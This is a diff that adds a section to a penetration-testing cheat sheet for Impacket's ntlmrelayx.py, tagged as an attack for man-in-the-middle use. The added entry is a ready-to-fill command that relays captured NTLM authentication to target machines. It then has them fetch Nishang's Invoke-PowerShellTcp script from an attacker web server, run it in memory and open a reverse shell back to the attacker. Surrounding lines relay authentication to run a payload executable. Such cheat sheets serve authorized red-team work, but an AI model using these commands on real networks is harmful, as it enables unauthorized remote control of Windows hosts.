@@ -23,6 +23,13 @@ smbserver.py -username <username> -password <password> <shareName> <sharePath>
 ntlmrelayx.py -tf <targets_file> -smb2support -e <payload_file|payload.exe>
 ```
 
+## ntlmrelay - reverseshell (nishang)
+#plateform/linux #target/serve #cat/ATTACK/MITM 
+Or powershell -e base64_string
+```
+ntlmrelayx.py -tf <targets_file> -smb2support -c "powershell -c IEX(New-Object NET.WebClient).DownloadString('http://<ip>:<http_port>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <ip> -Port <rport>"
+```
+
 ## ntlmrelay - socks
 #plateform/linux #target/serve #cat/ATTACK/MITM 
 ```
